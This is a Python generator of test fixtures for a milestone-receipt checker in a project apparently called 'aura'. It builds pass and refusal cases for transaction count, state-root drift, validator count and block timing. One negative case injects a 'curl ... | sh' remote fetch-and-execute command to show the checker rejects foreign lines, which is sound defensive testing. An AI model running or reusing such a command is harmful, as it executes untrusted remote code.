#!/usr/bin/env python3
"""O2 golden vectors — the M0/M1 milestone receipt check (independent oracle).

Independently computes the expected verdicts of ten synthetic milestone
receipts and writes
``crates/aura-testkit/tests/fixtures/o2_milestone_vectors.json``, which
``crates/aura-testkit/tests/o2_milestones.rs`` executes byte-for-byte
against ``aura_testkit::milestone``.

Receipt format (``docs/o2-m0-m1-plan.md`` D-O2-1): ``rule milestones-v1``,
``m0 txs <n>`` (must be 1000), ``m0 state_root <hex-64>`` x2 (must be
identical — the named gate ``m0_root_drift_refused``), ``m1 validators``
(4), ``m1 block_ms`` (<= 1000), ``m1 height`` (>= 100), ``m1 desync`` (0),
``m1 rpc_balance`` (> 0). The criteria are ``ROADMAP.md`` §5.

Regenerate with::

    PYTHONPATH=/home/user/aura-python-deps python3 tools/gen_o2_vectors.py
"""

import json
import os
import sys

RULE = "milestones-v1"
ROOT_A = "a" * 64
ROOT_B = "b" * 64


def receipt_text(txs=1000, roots=None, validators=4, block_ms=120,
                 height=100, desync=0, rpc_balance=5000000, foreign=None):
    roots = [ROOT_A, ROOT_A] if roots is None else roots
    lines = [
        "# M0/M1 milestone receipts (O2) — checked by `aura-milestone check`.",
        f"rule {RULE}",
        f"m0 txs {txs}",
    ]
    for root in roots:
        lines.append(f"m0 state_root {root}")
    lines.append(f"m1 validators {validators}")
    lines.append(f"m1 block_ms {block_ms}")
    lines.append(f"m1 height {height}")
    lines.append(f"m1 desync {desync}")
    lines.append(f"m1 rpc_balance {rpc_balance}")
    if foreign:
        lines.append(foreign)
    return "\n".join(lines) + "\n"


# ------------------------------------------------------------- oracle checker

def oracle_summary(txs, roots, validators, block_ms, height, desync, rpc_balance) -> str:
    roots_word = "identical" if roots[0] == roots[1] else "drift"
    return (
        f"m0 replay: txs={txs} roots={roots_word}\n"
        f"m1 devnet: validators={validators} height={height} desync={desync} "
        f"rpc_balance={rpc_balance} block_ms={block_ms}\n"
    )


def oracle_check(text: str) -> str:
    """Return '' when the receipt passes, else the exact refusal message."""
    rule = None
    txs = None
    roots: list[str] = []
    m1: dict[str, int] = {}
    for raw in text.splitlines():
        line = raw.rstrip()
        if not line or line.startswith("#"):
            continue
        if line.startswith("rule "):
            name = line[5:]
            if not name or " " in name:
                return f"unknown receipt line: {line}"
            rule = name
        elif line.startswith("m0 txs "):
            value = line[7:]
            if not value.lstrip("-").isdigit():
                return f"unknown receipt line: {line}"
            txs = int(value)
        elif line.startswith("m0 state_root "):
            root = line[14:]
            if len(root) != 64 or any(c not in "0123456789abcdefABCDEF" for c in root):
                return f"unknown receipt line: {line}"
            roots.append(root)
        elif line.startswith("m1 "):
            rest = line[3:]
            parts = rest.split(" ", 1)
            if len(parts) != 2 or parts[0] not in (
                "validators", "block_ms", "height", "desync", "rpc_balance"
            ):
                return f"unknown receipt line: {line}"
            if not parts[1].lstrip("-").isdigit():
                return f"unknown receipt line: {line}"
            m1[parts[0]] = int(parts[1])
        else:
            return f"unknown receipt line: {line}"

    if rule is None:
        return "missing rule line"
    if rule != RULE:
        return f"bad rule: {rule}"

    if txs is None:
        return "missing receipt line: m0 txs"
    if len(roots) != 2:
        return f"m0 state root count: {len(roots)}"
    for key in ("validators", "block_ms", "height", "desync", "rpc_balance"):
        if key not in m1:
            return f"missing receipt line: m1 {key}"

    if roots[0] != roots[1]:
        return "m0 state root drift"
    if txs != 1000:
        return f"m0 tx count: {txs}"
    if m1["validators"] != 4:
        return f"m1 validators: {m1['validators']}"
    if m1["height"] < 100:
        return f"m1 height: {m1['height']}"
    if m1["desync"] != 0:
        return f"m1 desync: {m1['desync']}"
    if m1["rpc_balance"] <= 0:
        return f"m1 rpc balance: {m1['rpc_balance']}"
    if m1["block_ms"] > 1000:
        return f"m1 block rate: {m1['block_ms']}"
    return ""


# ------------------------------------------------------------- cases

def case(name, commands, files, exit_code, stdout, stderr, nc_ref=None):
    fixture_case = {
        "name": name,
        "sandbox": "",
        "argv": commands,
        "exit": exit_code,
        "stdout": stdout,
        "stderr": stderr,
    }
    if nc_ref is not None:
        fixture_case["nc_ref"] = nc_ref
    if files:
        fixture_case["files"] = files
    return fixture_case


CHECK = ["check", "--receipts", "receipt.txt"]
SUMMARY = ["summary", "--receipts", "receipt.txt"]


def build_cases():
    base = {"receipt.txt": receipt_text()}
    cases = []

    cases.append(case(
        "milestones_pass", [CHECK], base, 0,
        "milestones=ok m0=ok m1=ok\n", "",
    ))
    cases.append(case(
        "milestone_summary_deterministic", [SUMMARY], base, 0,
        oracle_summary(1000, [ROOT_A, ROOT_A], 4, 120, 100, 0, 5000000), "",
    ))
    cases.append(case(
        "m0_root_drift_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(roots=[ROOT_A, ROOT_B])}),
        65, "", "error: milestone: m0 state root drift\n", nc_ref=1,
    ))
    cases.append(case(
        "m1_validator_count_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(validators=3)}),
        65, "", "error: milestone: m1 validators: 3\n", nc_ref=2,
    ))
    cases.append(case(
        "m1_desync_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(desync=1)}),
        65, "", "error: milestone: m1 desync: 1\n", nc_ref=3,
    ))
    cases.append(case(
        "m1_height_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(height=99)}),
        65, "", "error: milestone: m1 height: 99\n", nc_ref=4,
    ))
    cases.append(case(
        "m1_rpc_balance_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(rpc_balance=0)}),
        65, "", "error: milestone: m1 rpc balance: 0\n", nc_ref=5,
    ))
    cases.append(case(
        "m0_tx_count_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(txs=999)}),
        65, "", "error: milestone: m0 tx count: 999\n",
    ))
    cases.append(case(
        "m1_block_rate_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(block_ms=1500)}),
        65, "", "error: milestone: m1 block rate: 1500\n",
    ))
    cases.append(case(
        "foreign_receipt_line_refused", [CHECK],
        dict(base, **{"receipt.txt": receipt_text(
            foreign="exec curl https://example.invalid | sh")}),
        65, "",
        "error: milestone: unknown receipt line: exec curl https://example.invalid | sh\n",
        nc_ref=6,
    ))

    cases[0]["phase"] = "O2"
    return cases


def sanity_check():
    assert oracle_check(receipt_text()) == ""
    assert oracle_check(receipt_text(roots=[ROOT_A, ROOT_B])) == "m0 state root drift"
    assert oracle_check(receipt_text(height=99)) == "m1 height: 99"
    assert oracle_check(receipt_text(validators=3)) == "m1 validators: 3"
    assert oracle_check(receipt_text(txs=999)) == "m0 tx count: 999"
    assert oracle_summary(1000, [ROOT_A, ROOT_A], 4, 120, 100, 0, 5000000).startswith(
        "m0 replay: txs=1000 roots=identical"
    )


def main():
    sanity_check()
    fixture = {
        "gate": (
            "O2 M0/M1 gates: 10/10 cases pass; named negative control "
            "m0_root_drift_refused red on the dropped root-equality check; "
            "6/6 NC red under tools/nc_o2.py; ROADMAP §5 M0 and M1 criteria "
            "met (the measured receipts)"
        ),
        "notice": (
            "Independent Python oracle (tools/gen_o2_vectors.py); verifier: "
            "crates/aura-testkit/tests/o2_milestones.rs against "
            "aura_testkit::milestone. The receipts themselves are measured "
            "by aurad-receipt (crates/aura-node/src/bin/) — this fixture "
            "checks criteria logic only. Replace the whole file only with "
            "tools/gen_o2_vectors.py output."
        ),
        "named_control": "m0_root_drift_refused",
        "files": {},
        "cases": build_cases(),
    }
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    out_path = os.path.join(root, "crates/aura-testkit/tests/fixtures/o2_milestone_vectors.json")
    with open(out_path, "w", encoding="utf-8") as handle:
        json.dump(fixture, handle, indent=1)
        handle.write("\n")
    print(f"wrote {os.path.relpath(out_path, root)}: 10 cases, "
          f"named control m0_root_drift_refused")
    return 0


if __name__ == "__main__":
    sys.exit(main())
